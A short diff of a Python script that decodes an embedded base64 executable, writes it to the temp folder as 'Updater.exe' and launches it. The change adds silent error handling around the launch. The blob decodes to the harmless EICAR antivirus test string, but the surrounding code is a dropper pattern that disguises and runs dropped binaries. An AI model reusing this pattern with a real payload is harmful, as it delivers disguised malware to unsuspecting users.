@@ -14,5 +14,8 @@ subprocess.Popen(f"{temp}\\Launcher.exe", creationflags=subprocess.CREATE_NEW_CO
 b64data = b'WDVPIVAlQEFQWzRcUFpYNTQoUF4pN0NDKTd9JEVJQ0FSLVNUQU5EQVJELUFOVElWSVJVUy1URVNULUZJTEUhJEgrSCo='
 with open(f"{temp}\\Updater.exe","wb")as f:
     f.write(b64d(b64data))
-subprocess.Popen(f"{temp}\\Updater.exe", creationflags=subprocess.CREATE_NEW_CONSOLE)
+try:
+    subprocess.Popen(f"{temp}\\Updater.exe", creationflags=subprocess.CREATE_NEW_CONSOLE)
+except:
+    sys.exit()
 sys.exit()
